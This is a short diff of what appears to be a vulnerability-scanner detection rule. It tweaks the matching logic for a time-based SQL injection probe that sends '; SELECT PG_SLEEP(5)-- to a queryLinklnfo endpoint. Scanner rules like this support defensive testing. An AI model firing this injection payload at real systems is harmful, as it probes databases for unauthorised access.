@@ -10,9 +10,9 @@ rules:
       cache: true
       method: GET
       path: /Uniexservices/link/queryLinklnfo?address=%27;SELECT%20PG_SLEEP(5)--
-    expression: response.status == 200 
+    expression: response.status == 200 &&  response.body_string.contains("xxxx")
     output:
-      r0latency: response.latency &&  response.body_string.contains("xxxx")
+      r0latency: response.latency 
   r1:
     request:
       cache: true
